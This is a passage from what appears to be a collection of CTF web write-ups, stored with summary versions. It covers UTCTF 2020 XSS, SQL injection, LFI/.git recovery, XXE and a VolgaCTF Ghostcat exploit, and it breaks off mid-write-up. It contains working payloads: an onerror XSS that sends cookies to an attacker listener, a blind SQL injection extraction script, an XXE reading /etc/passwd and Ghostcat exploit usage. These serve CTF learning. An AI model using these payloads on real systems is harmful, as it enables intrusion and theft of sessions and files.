			cardBody.appendChild(cardText);
			card.appendChild(cardBody);
			messageBody.appendChild(card);
			return;
		}
	</script>

	<script>
		function showMessages(data) {
			const messageBody = document.getElementById('message-body');
			if (data.Messages.length == messageBody.children.length) {
				return;
			}
			const sortedMessages = data.Messages.sort((a, b) => b.Msg_Sent - a.Msg_Sent)
			messageBody.textContent = '';
			sortedMessages.forEach(message => {
				const name = message.User_ID == 1 ? ""Anon"" : ""Bratt Pid"";
				addMessage(message.Content, name);
			});
		}
	</script>
	
	<script>
		function loadMessages() {
			fetch('/messages')
				.then((response) => {
					return response.json();
				})
				.then((data) => {
					showMessages(data);
				});
			setTimeout(loadMessages, 10000);
		}
	</script>

	<script>
	  function sendMessage() {
		const message = document.getElementById('message'); 
		
		if (message.value === """") {
		  return false;
		}

		addMessage(message.value, ""Anon"");

		const data = {content: message.value}
		fetch('/chatt', {
		  method: 'POST',
		  body: JSON.stringify(data)
		});
		
		message.value = """";
		return true;
	  }
	</script>
```

Peforming some tests, you can discover that chat functionality is vulnerable to HTML tag injection, because the message sent to the server is then reflected into the web page and it is not escaped. An XSS can be performed using the `img` tag and the `onerror` attribute.

Analyzing cookies, an interesting cookie called `secret` can be found, but it is set to `none` value.

A listening server can be set up using *netcat*, e.g. `nc -lkv 1337`.

The following HTTP request can be crafted to attack the chat endpoint and steal cookies of the VIP user.

```
POST /chatt HTTP/1.1
Host: web3.utctf.live:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web3.utctf.live:8080/chatt
Content-Type: text/plain;charset=UTF-8
Origin: http://web3.utctf.live:8080
Content-Length: 115
Connection: close
Cookie: chat_id=d9ab6df5-6175-11ea-ae82-ee665abdd353; secret=none

{""content"":""<img src=\""foo.png\"" onerror=\""document.location='http://xxx.xxx.xxx.xxx:1337?c='+document.cookie;\"" />""}
```

On the listening server you will find the request sent by the victim browser.

```
Connection from ec2-18-213-193-80.compute-1.amazonaws.com 5015 received!
GET /?c=chat_id=d9ab6df5-6175-11ea-ae82-ee665abdd353;%20secret=utflag{95debad95cfb106081f33ceadc36bf9c} HTTP/1.1
Host: xxx.xxx.xxx.xxx:1337
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1:8080/chatt
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

The `secret` cookie will contain the flag.

```
utflag{95debad95cfb106081f33ceadc36bf9c}
```","The website simulates a chat with a VIP. Analyzing the HTML, some interesting JavaScript code can be found.

Peforming some tests, you can discover that chat functionality is vulnerable to HTML tag injection, because the message sent to the server is then reflected into the web page and it is not escaped. An XSS can be performed using the `img` tag and the `onerror` attribute.

Analyzing cookies, an interesting cookie called `secret` can be found, but it is set to `none` value.

A listening server can be set up using netcat.

The following HTTP request can be crafted to attack the chat endpoint and steal cookies of the VIP user.

On the listening server you will find the request sent by the victim browser.

The `secret` cookie will contain the flag."
"# UTCTF 2020 – epic admin pwn

* **Category:** web
* **Points:** 50

## Challenge

> this challenge is epic i promise
> 
> the flag is the password
> 
> http://web2.utctf.live:5006/
> 
> by matt

## Solution

The web site is basically a login form vulnerable to SQL injection. A simple payload like `' or '1'='1` can be used to discover this.

```
POST / HTTP/1.1
Host: web2.utctf.live:5006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://web2.utctf.live:5006
Connection: close
Referer: http://web2.utctf.live:5006/
Upgrade-Insecure-Requests: 1

username=admin&pass=%27+or+%271%27%3D%271

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 19:10:08 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 2496
Connection: Close

<!DOCTYPE html>
<html lang=""en"">
<head>
	<title>how shot web</title>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1"">
<!--===============================================================================================-->	
	<link rel=""icon"" type=""image/png"" href=""static/images/icons/favicon.ico""/>
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/bootstrap/css/bootstrap.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/fonts/font-awesome-4.7.0/css/font-awesome.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/fonts/Linearicons-Free-v1.0.0/icon-font.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/animate/animate.css"">
<!--===============================================================================================-->	
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/css-hamburgers/hamburgers.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/animsition/css/animsition.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/select2/select2.min.css"">
<!--===============================================================================================-->	
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/daterangepicker/daterangepicker.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/css/util.css"">
	<link rel=""stylesheet"" type=""text/css"" href=""static/css/main.css"">
<!--===============================================================================================-->
</head>
<body>
	
	<div class=""limiter"">
		<div class=""container-login100"">
            <span class=""login100-form-title p-b-43"">
                Welcome, admin!
            </span>
	
        </div>
	</div>
    </body>
</html>
```

Considering that the password is the flag, you can use SQL `LIKE` clause to discover each character one at a time.

```
POST / HTTP/1.1
Host: web2.utctf.live:5006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://web2.utctf.live:5006
Connection: close
Referer: http://web2.utctf.live:5006/
Upgrade-Insecure-Requests: 1

username=admin&pass=%27+or+password+like+%27u%25

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 19:18:38 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 2496
Connection: Close

<!DOCTYPE html>
<html lang=""en"">
<head>
	<title>how shot web</title>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1"">
<!--===============================================================================================-->	
	<link rel=""icon"" type=""image/png"" href=""static/images/icons/favicon.ico""/>
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/bootstrap/css/bootstrap.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/fonts/font-awesome-4.7.0/css/font-awesome.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/fonts/Linearicons-Free-v1.0.0/icon-font.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/animate/animate.css"">
<!--===============================================================================================-->	
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/css-hamburgers/hamburgers.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/animsition/css/animsition.min.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/select2/select2.min.css"">
<!--===============================================================================================-->	
	<link rel=""stylesheet"" type=""text/css"" href=""static/vendor/daterangepicker/daterangepicker.css"">
<!--===============================================================================================-->
	<link rel=""stylesheet"" type=""text/css"" href=""static/css/util.css"">
	<link rel=""stylesheet"" type=""text/css"" href=""static/css/main.css"">
<!--===============================================================================================-->
</head>
<body>
	
	<div class=""limiter"">
		<div class=""container-login100"">
            <span class=""login100-form-title p-b-43"">
                Welcome, admin!
            </span>
	
        </div>
	</div>
    </body>
</html>
```

This can be automated with a simple [Python script](epic-admin-pwn.py).

```python
import requests
import string

url_form = ""http://web2.utctf.live:5006/""
payload = ""username=admin&pass=' or password like '{}%""
possible_chars = list(""{}"" + string.digits + string.ascii_lowercase + string.ascii_uppercase)
headers = {
   ""User-Agent"": ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"", 
   ""Content-Type"": ""application/x-www-form-urlencoded""
}

found_chars = """"
while True:
    for new_char in possible_chars:
        attempt = found_chars + new_char
        print(""[*] Attempt: '{}'."".format(attempt))
        data = payload.format(attempt)
        print(""[*] Payload: {}."".format(data))
        page = requests.post(url_form, data=data, headers=headers)
    
        if ""Welcome"" in page.text:
            found_chars += new_char
            print(""[*] Found chars: '{}'"".format(found_chars))
            break
    
    if found_chars[-1] == ""}"":
        break
        
print(""The FLAG is: {}"".format(found_chars))
```

The script will discover the flag.

```
utflag{dual1pa1sp3rf3ct}
```","The web site is basically a login form vulnerable to SQL injection. A simple payload like `' or '1'='1` can be used to discover this.

Considering that the password is the flag, you can use SQL `LIKE` clause to discover each character one at a time.

This can be automated with a simple Python script.

The script will discover the flag.
"
"# UTCTF 2020 – Shrek Fans Only

* **Category:** web
* **Points:** 50

## Challenge

> Shrek seems to be pretty angry about something, so he deleted some important information off his site. He murmured something about Donkey being too committed to infiltrate his swamp. Can you checkout the site and see what the status is?
>
> http://3.91.17.218/.git/
> 
> by gg

## Solution

The text of the challenge reminds something about versioning control systems. Connecting to `http://3.91.17.218/.git/` will spawn a HTTP `403 Forbidden`. So a *git* local repository is present, but it can't be accessed directly.

The main web page is the following.

```html
<!DOCTYPE HTML>
<html>
<head>
<title>Shrek Fanclub</title>
</head>
<body>
<h1>What are you doing in my swamp?</h1>
<img src=""getimg.php?img=aW1nMS5qcGc%3D"">
<div>There used to be something here but Donkey won't leave me alone<div>
</body>
</html>
```

So you can discover another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`.

The value for the parameter is `aW1nMS5qcGc=` that base64 decoded will give `img1.jpg`. This endpoint is vulnerable to LFI and can be used to read files on the server.

For example you can use this to read the source code of the web pages.

`index.php` base64 encoded is `aW5kZXgucGhw`.

```
GET /getimg.php?img=aW5kZXgucGhw HTTP/1.1
Host: 3.91.17.218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Sat, 07 Mar 2020 19:57:33 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.20
Content-Length: 247
Connection: close
Content-Type: image/jpg

<!DOCTYPE HTML>
<html>
<head>
<title>Shrek Fanclub</title>
</head>
<body>
<h1>What are you doing in my swamp?</h1>
<img src=""getimg.php?img=aW1nMS5qcGc%3D"">
<div>There used to be something here but Donkey won't leave me alone<div>
</body>
</html>
```

`getimg.php` base64 encoded is `Z2V0aW1nLnBocA`.

```
GET /getimg.php?img=Z2V0aW1nLnBocA HTTP/1.1
Host: 3.91.17.218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Sat, 07 Mar 2020 19:58:41 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.20
Content-Length: 83
Connection: close
Content-Type: image/jpg

<?php
header(""Content-Type: image/jpg"");
readfile(base64_decode($_GET['img']));
?>
```

A local git repository has a well known structure under `.git` folder, so you can start to read standard files to build the local repository from scratch:
* `.git/index` base64 encoded is `LmdpdC9pbmRleA`;
* `.git/config` base64 encoded is `LmdpdC9jb25maWc`;
* `.git/HEAD` base64 encoded is `LmdpdC9IRUFE`;
* `.git/refs/remotes/origin/master` base64 encoded is `LmdpdC9yZWZzL3JlbW90ZXMvb3JpZ2luL21hc3Rlcg`;
* `.git/refs/heads/master` base64 encoded is `LmdpdC9yZWZzL2hlYWRzL21hc3Rlcg`;
* `.git/logs/HEAD` base64 encoded is `LmdpdC9sb2dzL0hFQUQ`.

In particular the `.git/logs/HEAD` file will allow you to discover the IDs of the commits and when the flag was removed from the source code.

```
GET /getimg.php?img=LmdpdC9sb2dzL0hFQUQ HTTP/1.1
Host: 3.91.17.218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Date: Sat, 07 Mar 2020 20:05:42 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.1.20
Content-Length: 839
Connection: close
Content-Type: image/jpg

0000000000000000000000000000000000000000 759be945739b04b63a09e7c02d51567501ead033 Shrek <shrek@shrek.com> 1583366532 +0000	commit (initial): initial commit
759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8 Shrek <shrek@shrek.com> 1583366704 +0000	commit: remove flag
976b625888ae0d9ee9543f025254f71e10b7bcf8 d421c6aa97e8b8a60d330336ec1e829c8ffd7199 Shrek <shrek@shrek.com> 1583367714 +0000	commit: added more stuff
d421c6aa97e8b8a60d330336ec1e829c8ffd7199 759be945739b04b63a09e7c02d51567501ead033 Shrek <shrek@shrek.com> 1583367723 +0000	checkout: moving from master to 759be945739b04b63a09e7c02d51567501ead033
759be945739b04b63a09e7c02d51567501ead033 d421c6aa97e8b8a60d330336ec1e829c8ffd7199 Shrek <shrek@shrek.com> 1583367740 +0000	checkout: moving from 759be945739b04b63a09e7c02d51567501ead033 to master
```

These IDs are used to name files in the local repository. So the following objects can be identified and downloaded:
* `.git/objects/75/9be945739b04b63a09e7c02d51567501ead033` base64 encoded is `LmdpdC9vYmplY3RzLzc1LzliZTk0NTczOWIwNGI2M2EwOWU3YzAyZDUxNTY3NTAxZWFkMDMz`;
* `.git/objects/97/6b625888ae0d9ee9543f025254f71e10b7bcf8` base64 encoded is `LmdpdC9vYmplY3RzLzk3LzZiNjI1ODg4YWUwZDllZTk1NDNmMDI1MjU0ZjcxZTEwYjdiY2Y4`;
* `.git/objects/d4/21c6aa97e8b8a60d330336ec1e829c8ffd7199` base64 encoded is `LmdpdC9vYmplY3RzL2Q0LzIxYzZhYTk3ZThiOGE2MGQzMzAzMzZlYzFlODI5YzhmZmQ3MTk5`;
* `.git/objects/75/9be945739b04b63a09e7c02d51567501ead033` base64 encoded is `LmdpdC9vYmplY3RzLzc1LzliZTk0NTczOWIwNGI2M2EwOWU3YzAyZDUxNTY3NTAxZWFkMDMz`;
* `.git/objects/d4/21c6aa97e8b8a60d330336ec1e829c8ffd7199` base64 encoded is `LmdpdC9vYmplY3RzL2Q0LzIxYzZhYTk3ZThiOGE2MGQzMzAzMzZlYzFlODI5YzhmZmQ3MTk5`.

At this point you can try to restore the source code.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git checkout -- .
error: unable to read sha1 file of getimg.php (c9566ff84d2e1ae3339bc1e6303d6d3340b5789f)
error: unable to read sha1 file of img1.jpg (0e8104f51db8f9ee08f0966656a3c2307e6cde5c)
error: unable to read sha1 file of index.php (5ab449745b9c25fb0b56c5fbab8d0c986541233e)
```

You can't perform the operation, but you have just discovered the missing objects IDs that can be downloaded:
* `.git/objects/c9/566ff84d2e1ae3339bc1e6303d6d3340b5789f` base64 encoded is `LmdpdC9vYmplY3RzL2M5LzU2NmZmODRkMmUxYWUzMzM5YmMxZTYzMDNkNmQzMzQwYjU3ODlm`;
* `.git/objects/0e/8104f51db8f9ee08f0966656a3c2307e6cde5c` base64 encoded is `LmdpdC9vYmplY3RzLzBlLzgxMDRmNTFkYjhmOWVlMDhmMDk2NjY1NmEzYzIzMDdlNmNkZTVj`;
* `.git/objects/5a/b449745b9c25fb0b56c5fbab8d0c986541233e` base64 encoded is `LmdpdC9vYmplY3RzLzVhL2I0NDk3NDViOWMyNWZiMGI1NmM1ZmJhYjhkMGM5ODY1NDEyMzNl`.

Now you can correctly restore the source code files.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git checkout -- .

m3ssap0@foo  ~/shrek-fans-only (master)
$ ls
getimg.php  img1.jpg  index.php
```

The next step is to check differences among the commit when the flag was removed (`976b625888ae0d9ee9543f025254f71e10b7bcf8`) and the first commit when the flag was present (`759be945739b04b63a09e7c02d51567501ead033`).

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read tree aeeea4cfa5afa4dcb70e1d6109790377e7bcec4d
```

Another object is missing: `.git/objects/ae/eea4cfa5afa4dcb70e1d6109790377e7bcec4d` base64 encoded is `LmdpdC9vYmplY3RzL2FlL2VlYTRjZmE1YWZhNGRjYjcwZTFkNjEwOTc5MDM3N2U3YmNlYzRk`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read tree 2f74a95c3a29776d84041f360e64d6e6b2edc7bd
```

Another object is missing: `.git/objects/2f/74a95c3a29776d84041f360e64d6e6b2edc7bd` base64 encoded is ` LmdpdC9vYmplY3RzLzJmLzc0YTk1YzNhMjk3NzZkODQwNDFmMzYwZTY0ZDZlNmIyZWRjN2Jk`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read 6578c62fa248d078ffc551405c9700e3ccc9f5b3
```

Another object is missing: `.git/objects/65/78c62fa248d078ffc551405c9700e3ccc9f5b3` base64 encoded is ` LmdpdC9vYmplY3RzLzY1Lzc4YzYyZmEyNDhkMDc4ZmZjNTUxNDA1Yzk3MDBlM2NjYzlmNWIz`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
fatal: unable to read 40d2c576876fd085d830739589294ed8c6412fc9
```

Another object is missing: `.git/objects/40/d2c576876fd085d830739589294ed8c6412fc9` base64 encoded is ` LmdpdC9vYmplY3RzLzQwL2QyYzU3Njg3NmZkMDg1ZDgzMDczOTU4OTI5NGVkOGM2NDEyZmM5`.

```
m3ssap0@foo  ~/shrek-fans-only (master)
$ git diff 759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8
diff --git a/index.php b/index.php
index 6578c62..40d2c57 100644
--- a/index.php
+++ b/index.php
@@ -6,6 +6,6 @@
 <body>
 <h1>What are you doing in my swamp?</h1>
 <img src=""imgproxy.php?img=img1.jpg"">
-<div>utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}</div>
+<div>There used to be something here but Donkey won't leave me alone<div>
 </body>
 </html>
```

The flag is the following.

```
utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}
```","The text of the challenge reminds something about versioning control systems. Connecting to `.git/` endpoint will spawn a HTTP `403 Forbidden`. So a git local repository is present, but it can't be accessed directly.

From the main webpage you can discover another endpoint.

The value for the parameter base64 decoded will give `img1.jpg`. This endpoint is vulnerable to LFI and can be used to read files on the server.

For example you can use this to read the source code of the web pages.

A local git repository has a well known structure under `.git` folder, so you can start to read standard files to build the local repository from scratch.

In particular the `.git/logs/HEAD` file will allow you to discover the IDs of the commits and when the flag was removed from the source code.

These IDs are used to name files in the local repository. So the following objects can be identified and downloaded.

At this point you can try to restore the source code.

The next step is to check differences among the commit when the flag was removed and the first commit when the flag was present and finally get the flag.
"
"# UTCTF 2020 – spooky store

* **Category:** web
* **Points:** 50

## Challenge

> It's a simple webpage with 3 buttons, you got this :)
> 
> http://web1.utctf.live:5005/
> 
> by matt

## Solution

The web page sends data via XML envelops, using two Javascript files, when buttons are pressed.

The first script (`http://web1.utctf.live:5005/static/js/xmlLocationCheckPayload.js`) crafts the XML envelope.

```javascript
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version=""1.0"" encoding=""UTF-8""?>';
    xml += '<locationCheck>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</locationCheck>';
    return xml;
}
```

The second script (`http://web1.utctf.live:5005/static/js/locationCheck.js`) sends the XML envelope and reads the answer.

```javascript
document.querySelectorAll('.locationForm').forEach(item => {
    item.addEventListener(""submit"", function(e) {
        checkLocation(this.getAttribute(""method""), this.getAttribute(""action""), new FormData(this));
        e.preventDefault();
    });
});
function checkLocation(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t)
                : ""Could not fetch nearest location :(""
            )
            .then(res => document.getElementById(""locationResult"").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```

A normal interaction is like the following.

```
POST /location HTTP/1.1
Host: web1.utctf.live:5005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web1.utctf.live:5005/
Content-Type: application/xml
Origin: http://web1.utctf.live:5005
Content-Length: 93
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?><locationCheck><productId>1</productId></locationCheck>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 11:04:35 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 60
Connection: Close

The nearest coordinates to you are: 25.0000Â° N, 71.0000Â° W
```

Passing a wrong `productId` will trigger the following error message.

```
POST /location HTTP/1.1
Host: web1.utctf.live:5005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web1.utctf.live:5005/
Content-Type: application/xml
Origin: http://web1.utctf.live:5005
Content-Length: 93
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?><locationCheck><productId>0</productId></locationCheck>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 11:05:11 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 20
Connection: Close

Invalid ProductId: 0
```

The passed parameter is reflected to the response, so if the system is vulnerable to XXE you can read files on the server.

You can craft a payload like the following.

```
POST /location HTTP/1.1
Host: web1.utctf.live:5005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://web1.utctf.live:5005/
Content-Type: application/xml
Origin: http://web1.utctf.live:5005
Content-Length: 176
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><locationCheck><productId>&xxe;</productId></locationCheck>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 11:09:12 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 1234
Connection: Close

Invalid ProductId: root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
utctf:x:1337:utflag{n3xt_y3ar_go1ng_bl1nd}
```

And discover the flag into `/etc/passwd`.

```
utflag{n3xt_y3ar_go1ng_bl1nd}
```","The web page sends data via XML envelops, using two Javascript files, when buttons are pressed.

The first script crafts the XML envelope.

The second script sends the XML envelope and reads the answer.

Performing a POST request passing a wrong `productId` will trigger an error.

The passed parameter is reflected to the response, so if the system is vulnerable to XXE you can read files on the server.

You can craft a payload and discover the flag into `/etc/passwd`.
"
"# VolgaCTF Qualifier 2020 – NetCorp

* **Category:** web
* **Points:** 100

## Challenge

> Another telecom provider. Hope these guys prepared well enough for the network load...
> 
> http://netcorp.q.2020.volgactf.ru:7782/

## Solution

After doing some recon, you can discover that the application server is an old Apache Tomcat installation. In particular, trying to reach `http://netcorp.q.2020.volgactf.ru:7782/%00` URL will spawn an error containing the version: `Apache Tomcat/9.0.24`.

This version is affected of [*Ghostcat vulnerability* (*CVE-2020-1938*)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938).

For this vulnerability, several public exploits exist. One of them is [*Ajp Shooter*](https://github.com/00theway/Ghostcat-CNVD-2020-10487).

You can checkout and use it to read `web.xml` file.

```
root@m3ss4p0:~/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/""1000-1585246342000""
[<] Last-Modified: Thu, 26 Mar 2020 18:12:22 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1000

<!DOCTYPE web-app PUBLIC
 ""-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN""
 ""http://java.sun.com/dtd/web-app_2_3.dtd"" >

<web-app>
  <display-name>NetCorp</display-name>
  
  
  <servlet>
  	<servlet-name>ServeScreenshot</servlet-name>
  	<display-name>ServeScreenshot</display-name>
  	<servlet-class>ru.volgactf.netcorp.ServeScreenshotServlet</servlet-class>
  </servlet>
  
  <servlet-mapping>
  	<servlet-name>ServeScreenshot</servlet-name>
  	<url-pattern>/ServeScreenshot</url-pattern>
  </servlet-mapping>


	<servlet>
		<servlet-name>ServeComplaint</servlet-name>
		<display-name>ServeComplaint</display-name>
		<description>Complaint info</description>
		<servlet-class>ru.volgactf.netcorp.ServeComplaintServlet</servlet-class>
	</servlet>

	<servlet-mapping>
		<servlet-name>ServeComplaint</servlet-name>
		<url-pattern>/ServeComplaint</url-pattern>
	</servlet-mapping>

	<error-page>
		<error-code>404</error-code>
		<location>/404.html</location>
	</error-page>

  
  
</web-app>
```

At this point, you can discover that two servlets exist:
* `ru.volgactf.netcorp.ServeScreenshotServlet` available at `http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot`;
* `ru.volgactf.netcorp.ServeComplaintServlet` available at `http://netcorp.q.2020.volgactf.ru:7782/ServeComplaint`.

You can easily get both `.class` files using the exploit.

```
